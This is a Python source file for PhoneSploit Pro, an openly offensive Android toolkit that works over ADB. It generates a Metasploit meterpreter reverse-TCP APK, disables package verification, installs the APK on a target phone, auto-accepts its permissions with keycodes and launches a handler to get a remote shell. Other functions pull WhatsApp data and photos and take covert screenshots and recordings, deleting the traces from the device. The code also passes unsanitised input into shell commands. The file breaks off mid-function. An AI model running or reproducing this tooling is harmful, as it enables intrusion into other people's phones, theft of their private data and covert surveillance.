"""
    COPYRIGHT DISCLAIMER

    Script : PhoneSploit Pro - All in One Android Hacking ADB Toolkit  

    Copyright (C) 2023  Mohd Azeem (github.com/AzeemIdrisi)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

    Forking and modifying are allowed, but credit must be given to the
    original developer, [Mohd Azeem (github.com/AzeemIdrisi)], and copying the code
    is not permitted without permission.

    For any queries, Contact me at : azeemidrisi@protonmail.com
"""

import os
import random
import socket
import time
import subprocess
import platform
import datetime
import nmap
from modules import banner
from modules import color


def start():
    # Creating Downloaded-Files folder if it does not exist
    try:
        # Creates a folder to store pulled files
        os.mkdir("Downloaded-Files")
    except:
        pass

    # Checking OS
    global operating_system, opener
    operating_system = platform.system()
    if operating_system == "Windows":
        # Windows specific configuration
        windows_config()
    else:
        # macOS only
        if operating_system == "Darwin":
            opener = "open"

        # On Linux and macOS both
        import readline  # Arrow Key

        check_packages()  # Checking for required packages


def windows_config():
    global clear, opener  # , move
    clear = "cls"
    opener = "start"
    # move = 'move'


def check_packages():
    adb_status = subprocess.call(["which", "adb"])
    scrcpy_status = subprocess.call(["which", "scrcpy"])
    metasploit_status = subprocess.call(["which", "msfconsole"])
    nmap_status = subprocess.call(["which", "nmap"])

    if (
        adb_status != 0
        or metasploit_status != 0
        or scrcpy_status != 0
        or nmap_status != 0
    ):
        print(
            f"\n{color.RED}ERROR : The following required software are NOT installed!\n"
        )

        count = 0  # Count variable for indexing

        if adb_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. {color.YELLOW}ADB{color.WHITE}")

        if metasploit_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Metasploit-Framework{color.WHITE}")

        if scrcpy_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Scrcpy{color.WHITE}")

        if nmap_status != 0:
            count = count + 1
            print(f"{color.YELLOW}{count}. Nmap{color.WHITE}")

        print(f"\n{color.CYAN}Please install the above listed software.{color.WHITE}\n")

        choice = input(
            f"\n{color.GREEN}Do you still want to continue to PhoneSploit Pro?{color.WHITE}     Y / N > "
        ).lower()
        if choice == "y" or choice == "":
            return
        elif choice == "n":
            exit_phonesploit_pro()
            return
        else:
            while choice != "y" and choice != "n" and choice != "":
                choice = input("\nInvalid choice!, Press Y or N > ").lower()
                if choice == "y" or choice == "":
                    return
                elif choice == "n":
                    exit_phonesploit_pro()
                    return


def display_menu():
    """Displays banner and menu"""
    print(selected_banner, page)


def clear_screen():
    """Clears the screen and display menu"""
    os.system(clear)
    display_menu()


def change_page(name):
    global page, page_number
    if name == "p":
        if page_number > 0:
            page_number = page_number - 1
    elif name == "n":
        if page_number < 2:
            page_number = page_number + 1
    page = banner.menu[page_number]
    clear_screen()


def connect():
    # Connect only 1 device at a time
    print(
        f"\n{color.CYAN}Enter target phone's IP Address       {color.YELLOW}Example : 192.168.1.23{color.WHITE}"
    )
    ip = input("> ")
    if ip == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        # Restart ADB on new connection.
        if ip.count(".") == 3:
            os.system(
                "adb kill-server > docs/hidden.txt 2>&1&&adb start-server > docs/hidden.txt 2>&1"
            )
            os.system("adb connect " + ip + ":5555")
        else:
            print(
                f"\n{color.RED} Invalid IP Address\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )


def list_devices():
    print("\n")
    os.system("adb devices -l")
    print("\n")


def disconnect():
    print("\n")
    os.system("adb disconnect")
    print("\n")


def exit_phonesploit_pro():
    global run_phonesploit_pro
    run_phonesploit_pro = False
    print("\nExiting...\n")


def get_shell():
    print("\n")
    os.system("adb shell")


def get_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"screenshot-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.png"
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}"
        )
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}"
        )
    else:
        print(
            f"\n{color.PURPLE}Saving screenshot to {screenshot_location}\n{color.WHITE}"
        )

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    # Asking to open file
    choice = input(
        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"vid-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.mp4"

    duration = input(
        f"\n{color.CYAN}Enter the recording duration (in seconds) > {color.WHITE}"
    )
    print(f"\n{color.YELLOW}Starting Screen Recording...\n{color.WHITE}")
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}"
    )

    if screenrecord_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}"
        )
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving video to {screenrecord_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    # Asking to open file
    choice = input(
        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def pull_file():
    global pull_location
    print(
        f"\n{color.CYAN}Enter file path           {color.YELLOW}Example : /sdcard/Download/sample.jpg{color.WHITE}"
    )
    location = input("\n> /sdcard/")
    # Checking if specified file or folder exists in Android
    if os.system(f"adb shell test -e /sdcard/{location}") == 0:
        pass
    else:
        print(
            f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}"
        )
        return

    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all files, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving file to {pull_location}\n{color.WHITE}")
    os.system(f"adb pull /sdcard/{location} {pull_location}")

    # Asking to open file
    choice = input(
        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
    ).lower()

    # updating location = file_name if it existed inside a folder
    # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
    file_path = location.split("/")
    location = file_path[len(file_path) - 1]

    # processing request
    if choice == "y" or choice == "":
        os.system(f"{opener} {pull_location}/{location}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {pull_location}/{location}")


def push_file():
    location = input(f"\n{color.CYAN}Enter file path in computer{color.WHITE} > ")

    if location == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        if operating_system == "Windows":
            file_status = int(
                os.popen(f"if exist {location} (echo 0) ELSE (echo 1)").read()
            )
        else:
            file_status = os.system(f"test -e {location}")
        if file_status == 0:
            pass
        else:
            print(
                f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}"
            )
            return
        destination = input(
            f"\n{color.CYAN}Enter destination path              {color.YELLOW}Example : /sdcard/Documents{color.WHITE}\n> /sdcard/"
        )
        os.system("adb push " + location + " /sdcard/" + destination)


def stop_adb():
    os.system("adb kill-server")
    print("\nStopped ADB Server")


def install_app():
    file_location = input(f"\n{color.CYAN}Enter APK path in computer{color.WHITE} > ")

    if file_location == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        if file_location[len(file_location) - 1] == " ":
            file_location = file_location.removesuffix(" ")
        file_location = file_location.replace("'", "")
        file_location = file_location.replace('"', "")
        if not os.path.isfile(file_location):
            print(
                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}"
            )
            return
        else:
            file_location = "'" + file_location + "'"
            os.system("adb install " + file_location)
        print("\n")


def uninstall_app():
    print(
        f"""
    {color.WHITE}1.{color.GREEN} Select from App List
    {color.WHITE}2.{color.GREEN} Enter Package Name Manually
    {color.WHITE}"""
    )

    mode = input("> ")
    if mode == "1":
        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"{color.GREEN}{i}.{color.WHITE} {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if app.isdigit():
            if int(app) <= len(list) and int(app) > 0:
                package = list[int(app) - 1].replace("package:", "")
                print(f"\n{color.RED}Uninstalling {color.YELLOW}{package}{color.WHITE}")
                os.system("adb uninstall " + package)
            else:
                print(
                    f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
                )
                return
        else:
            print(
                f"\n{color.RED} Expected an Integer Value\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
            return

    elif mode == "2":
        print(
            f"\n{color.CYAN}Enter package name     {color.WHITE}Example : com.spotify.music "
        )
        package_name = input("> ")

        if package_name == "":
            print(
                f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
        else:
            os.system("adb uninstall " + package_name)
    else:
        print(
            f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return

    print("\n")


def launch_app():
    print(
        f"""
    {color.WHITE}1.{color.GREEN} Select from App List
    {color.WHITE}2.{color.GREEN} Enter Package Name Manually
    {color.WHITE}"""
    )

    mode = input("> ")
    if mode == "1":
        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"{color.GREEN}{i}.{color.WHITE} {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if app.isdigit():
            if int(app) <= len(list) and int(app) > 0:
                package_name = list[int(app) - 1].replace("package:", "")
            else:
                print(
                    f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
                )
                return
        else:
            print(
                f"\n{color.RED} Expected an Integer Value\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
            return

    elif mode == "2":
        ## Old
        print(
            f"\n{color.CYAN}Enter package name :     {color.WHITE}Example : com.spotify.music "
        )
        package_name = input("> ")

        if package_name == "":
            print(
                f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
            return

    os.system("adb shell monkey -p " + package_name + " 1")
    print("\n")


def list_apps():
    print(
        f"""

    {color.WHITE}1.{color.GREEN} List third party packages {color.WHITE}
    {color.WHITE}2.{color.GREEN} List all packages {color.WHITE}
    """
    )
    mode = input("> ")

    if mode == "1":
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"{color.GREEN}{i}.{color.WHITE} {app}")
    elif mode == "2":
        list = os.popen("adb shell pm list packages").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"{color.GREEN}{i}.{color.WHITE} {app}")
    else:
        print(
            f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
    print("\n")


def reboot(key):
    print(
        f"\n{color.RED}[Warning]{color.YELLOW} Restarting will disconnect the device{color.WHITE}"
    )
    choice = input("\nDo you want to continue?     Y / N > ").lower()
    if choice == "y" or choice == "":
        pass
    elif choice == "n":
        return
    else:
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                pass
            elif choice == "n":
                return

    if key == "system":
        os.system("adb reboot")
    else:
        print(
            f"""
    {color.WHITE}1.{color.GREEN} Reboot to Recovery Mode
    {color.WHITE}2.{color.GREEN} Reboot to Bootloader
    {color.WHITE}3.{color.GREEN} Reboot to Fastboot Mode
    {color.WHITE}"""
        )
        mode = input("> ")
        if mode == "1":
            os.system("adb reboot recovery")
        elif mode == "2":
            os.system("adb reboot bootloader")
        elif mode == "3":
            os.system("adb reboot fastboot")
        else:
            print(
                f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
            return

    print("\n")


def list_files():
    print("\n")
    os.system("adb shell ls -a /sdcard/")
    print("\n")


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def instructions():
    """Prints instructions for Metasploit and returns user's choice"""
    os.system(clear)
    print(banner.instructions_banner + banner.instruction)
    choice = input("> ")
    if choice == "":
        return True
    else:
        return False


def hack():
    continue_hack = instructions()
    if continue_hack:
        os.system(clear)
        ip = get_ip_address()  # getting IP Address to create payload
        lport = "4444"
        print(
            f"\n{color.CYAN}Using LHOST : {color.WHITE}{ip}{color.CYAN} & LPORT : {color.WHITE}{lport}{color.CYAN} to create payload\n{color.WHITE}"
        )

        choice = input(
            f"\n{color.YELLOW}Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > {color.WHITE}"
        ).lower()

        if choice == "m":
            ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
            lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
        elif choice != "":
            while choice != "m" and choice != "":
                choice = input(
                    f"\n{color.RED}Invalid selection! , Press 'Enter' OR M > {color.WHITE}"
                ).lower()
                if choice == "m":
                    ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
                    lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")

        print(banner.hacking_banner)
        print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
        # creating payload
        os.system(
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk"
        )
        print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
        os.system("adb shell input keyevent 3")  # Going on Home Screen

        # Disabling App Verification
        os.system("adb shell settings put global package_verifier_enable 0")
        os.system("adb shell settings put global verifier_verify_adb_installs 0")

        # installing apk to device
        if operating_system == "Windows":
            # (used 'start /b' to execute command in background)
            # os.system("start /b adb install -r test.apk")
            os.system("adb install -r test.apk")
        else:
            # (used ' &' to execute command in background)
            # os.system("adb install -r test.apk &")
            os.system("adb install -r test.apk")
        # time.sleep(5)  # waiting for apk to be installed

        # Discarding these steps
        # print(
        #     f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
        # os.system('adb shell input keyevent 20')
        # os.system('adb shell input keyevent 20')
        # os.system('adb shell input keyevent 66')

        # Keyboard input to accept app install
        print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
        package_name = "com.metasploit.stage"  # payload package name
        os.system("adb shell monkey -p " + package_name + " 1")
        time.sleep(3)  # waiting for app to launch

        # Keyboard input to accept app permissions
        print(
            f"\n{color.CYAN}Sending keycodes to accept the app permissions\n{color.WHITE}"
        )
        os.system("adb shell input keyevent 22")
        os.system("adb shell input keyevent 22")
        os.system("adb shell input keyevent 66")

        # Launching Metasploit
        print(
            f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}"
        )
        os.system(
            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'"
        )

        # Re-Enabling App Verification (Restoring Device to Previous State)
        os.system("adb shell settings put global package_verifier_enable 1")
        os.system("adb shell settings put global verifier_verify_adb_installs 1")

    else:
        print("\nGoing Back to Main Menu\n")


def copy_whatsapp():
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save WhatsApp Data, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving data to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving data to {pull_location}\n{color.WHITE}")

    # folder_status = os.system(
    #     'adb shell test -d "/sdcard/Android/media/com.whatsapp/WhatsApp"')

    # 'test -d' checks if directory exist or not
    # If WhatsApp exists in Android
    if (
        os.system('adb shell test -d "/sdcard/Android/media/com.whatsapp/WhatsApp"')
        == 0
    ):
        location = "/sdcard/Android/media/com.whatsapp/WhatsApp"
    elif os.system('adb shell test -d "/sdcard/WhatsApp"') == 0:
        location = "/sdcard/WhatsApp"
    else:
        print(
            f"{color.RED}\n[Error]{color.GREEN} WhatsApp folder does not exist {color.GREEN}"
        )
        return

    os.system(f"adb pull {location} {pull_location}")
    print("\n")


def copy_screenshots():
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all Screenshots, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")

    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving Screenshots to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving Screenshots to {pull_location}\n{color.WHITE}")

    # Checking if folder exists
    if os.system('adb shell test -d "/sdcard/Pictures/Screenshots"') == 0:
        location = "/sdcard/Pictures/Screenshots"
    elif os.system('adb shell test -d "/sdcard/DCIM/Screenshots"') == 0:
        location = "/sdcard/DCIM/Screenshots"
    elif os.system('adb shell test -d "/sdcard/Screenshots"') == 0:
        location = "/sdcard/Screenshots"
    else:
        print(
            f"{color.RED}\n[Error]{color.GREEN} Screenshots folder does not exist {color.GREEN}"
        )
        return
    os.system(f"adb pull {location} {pull_location}")
    print("\n")


def copy_camera():
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all Photos, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving Photos to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving Photos to {pull_location}\n{color.WHITE}")

    # Checking if folder exists
    if os.system('adb shell test -d "/sdcard/DCIM/Camera"') == 0:
        location = "/sdcard/DCIM/Camera"
    else:
        print(
            f"{color.RED}\n[Error]{color.GREEN} Camera folder does not exist {color.GREEN}"
        )
        return
    os.system(f"adb pull {location} {pull_location}")
    print("\n")


def anonymous_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"screenshot-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.png"
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}"
        )
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}"
        )
    else:
        print(
            f"\n{color.PURPLE}Saving screenshot to {screenshot_location}\n{color.WHITE}"
        )

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    print(f"\n{color.YELLOW}Deleting screenshot from Target device\n{color.WHITE}")
    os.system(f"adb shell rm /sdcard/{file_name}")

    # Asking to open file
    choice = input(
        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def anonymous_screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"vid-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.mp4"

    duration = input(
        f"\n{color.CYAN}Enter the recording duration (in seconds) > {color.WHITE}"
    )
    print(f"\n{color.YELLOW}Starting Screen Recording...\n{color.WHITE}")
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}"
    )

    if screenrecord_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}"
        )
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving video to {screenrecord_location}\n{color.WHITE}")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    print(f"\n{color.YELLOW}Deleting video from Target device\n{color.WHITE}")
    os.system(f"adb shell rm /sdcard/{file_name}")
    # Asking to open file
    choice = input(
        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def use_keycode():
    keycodes = True
    os.system(clear)
    print(banner.keycode_menu)
    while keycodes:
        print(f"\n {color.CYAN}99 : Clear Screen                0 : Main Menu")
        keycode_option = input(
            f"{color.RED}\n[KEYCODE] {color.WHITE}Enter selection > "
        ).lower()

        match keycode_option:
            case "0":
                keycodes = False
                display_menu()
            case "99":
                os.system(clear)
                print(banner.keycode_menu)
            case "1":
                text = input(f"\n{color.CYAN}Enter text > {color.WHITE}")
                os.system(f'adb shell input text "{text}"')
                print(f'{color.YELLOW}\nEntered {color.WHITE}"{text}"')
            case "2":
                os.system("adb shell input keyevent 3")
                print(f"{color.YELLOW}\nPressed Home Button{color.WHITE}")
            case "3":
                os.system("adb shell input keyevent 4")
                print(f"{color.YELLOW}\nPressed Back Button{color.WHITE}")
            case "4":
                os.system("adb shell input keyevent 187")
                print(f"{color.YELLOW}\nPressed Recent Apps Button{color.WHITE}")
            case "5":
                os.system("adb shell input keyevent 26")
                print(f"{color.YELLOW}\nPressed Power Key{color.WHITE}")
            case "6":
                os.system("adb shell input keyevent 19")
                print(f"{color.YELLOW}\nPressed DPAD Up{color.WHITE}")
            case "7":
                os.system("adb shell input keyevent 20")
                print(f"{color.YELLOW}\nPressed DPAD Down{color.WHITE}")
            case "8":
                os.system("adb shell input keyevent 21")
                print(f"{color.YELLOW}\nPressed DPAD Left{color.WHITE}")
            case "9":
                os.system("adb shell input keyevent 22")
                print(f"{color.YELLOW}\nPressed DPAD Right{color.WHITE}")
            case "10":
                os.system("adb shell input keyevent 67")
                print(f"{color.YELLOW}\nPressed Delete/Backspace{color.WHITE}")
            case "11":
                os.system("adb shell input keyevent 66")
                print(f"{color.YELLOW}\nPressed Enter{color.WHITE}")
            case "12":
                os.system("adb shell input keyevent 24")
                print(f"{color.YELLOW}\nPressed Volume Up{color.WHITE}")
            case "13":
                os.system("adb shell input keyevent 25")
                print(f"{color.YELLOW}\nPressed Volume Down{color.WHITE}")
            case "14":
                os.system("adb shell input keyevent 126")
                print(f"{color.YELLOW}\nPressed Media Play{color.WHITE}")
            case "15":
                os.system("adb shell input keyevent 127")
                print(f"{color.YELLOW}\nPressed Media Pause{color.WHITE}")
            case "16":
                os.system("adb shell input keyevent 61")
                print(f"{color.YELLOW}\nPressed Tab Key{color.WHITE}")
            case "17":
                os.system("adb shell input keyevent 111")
                print(f"{color.YELLOW}\nPressed Esc Key{color.WHITE}")

            case other:
                print("\nInvalid selection!\n")


def open_link():
    print(
        f"\n{color.YELLOW}Enter URL              {color.CYAN}Example : https://github.com {color.WHITE}"
    )
    url = input("> ")

    if url == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        print(f'\n{color.YELLOW}Opening "{url}" on device        \n{color.WHITE}')
        os.system(f"adb shell am start -a android.intent.action.VIEW -d {url}")
        print("\n")


def open_photo():
    location = input(
        f"\n{color.YELLOW}Enter Photo location in computer{color.WHITE} > "
    )

    if location == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        if location[len(location) - 1] == " ":
            location = location.removesuffix(" ")
        location = location.replace("'", "")
        location = location.replace('"', "")
        if not os.path.isfile(location):
            print(
                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}"
            )
            return
        else:
            location = '"' + location + '"'
            os.system("adb push " + location + " /sdcard/")

        file_path = location.split("/")
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == "Windows":
            file_path = file_name.split("\\")
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", "")
        file_name = file_name.replace('"', "")
        file_name = "'" + file_name + "'"
        print(file_name)
        print(f"\n{color.YELLOW}Opening Photo on device        \n{color.WHITE}")
        os.system(
            f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t image/jpeg'
        )  # -n com.android.chrome/com.google.android.apps.chrome.Main
        print("\n")


def open_audio():
    location = input(
        f"\n{color.YELLOW}Enter Audio location in computer{color.WHITE} > "
    )

    if location == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        if location[len(location) - 1] == " ":
            location = location.removesuffix(" ")
        location = location.replace("'", "")
        location = location.replace('"', "")
        if not os.path.isfile(location):
            print(
                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}"
            )
            return
        else:
            location = '"' + location + '"'
            os.system("adb push " + location + " /sdcard/")

        file_path = location.split("/")
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == "Windows":
            file_path = file_name.split("\\")
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", "")
        file_name = file_name.replace('"', "")

        file_name = "'" + file_name + "'"
        print(file_name)

        print(f"\n{color.YELLOW}Playing Audio on device        \n{color.WHITE}")
        os.system(
            f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t audio/mp3'
        )

        # -n com.android.chrome/com.google.android.apps.chrome.Main

        # print(
        #     f"\n{color.YELLOW}Waiting for 5 seconds before playing file.\n{color.WHITE}"
        # )
        # time.sleep(5)
        # # To play the file using Chrome
        # os.system("adb shell input keyevent 126")
        print("\n")


def open_video():
    location = input(
        f"\n{color.YELLOW}Enter Video location in computer{color.WHITE} > "
    )

    if location == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        if location[len(location) - 1] == " ":
            location = location.removesuffix(" ")
        location = location.replace("'", "")
        location = location.replace('"', "")
        if not os.path.isfile(location):
            print(
                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}"
            )
            return
        else:
            location = '"' + location + '"'
            os.system("adb push " + location + " /sdcard/")

        file_path = location.split("/")
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == "Windows":
            file_path = file_name.split("\\")
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", "")
        file_name = file_name.replace('"', "")
        file_name = "'" + file_name + "'"
        print(file_name)

        print(f"\n{color.YELLOW}Playing Video on device        \n{color.WHITE}")
        os.system(
            f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t video/mp4'
        )

        # -n com.android.chrome/com.google.android.apps.chrome.Main

        # print(
        #     f"\n{color.YELLOW}Waiting for 5 seconds before playing file.\n{color.WHITE}"
        # )
        # time.sleep(5)
        # # To play the file using Chrome
        # os.system("adb shell input keyevent 126")
        print("\n")


def get_device_info():
    model = os.popen(f"adb shell getprop ro.product.model").read()
    manufacturer = os.popen(f"adb shell getprop ro.product.manufacturer").read()
    chipset = os.popen(f"adb shell getprop ro.product.board").read()
    android = os.popen(f"adb shell getprop ro.build.version.release").read()
    security_patch = os.popen(
        f"adb shell getprop ro.build.version.security_patch"
    ).read()
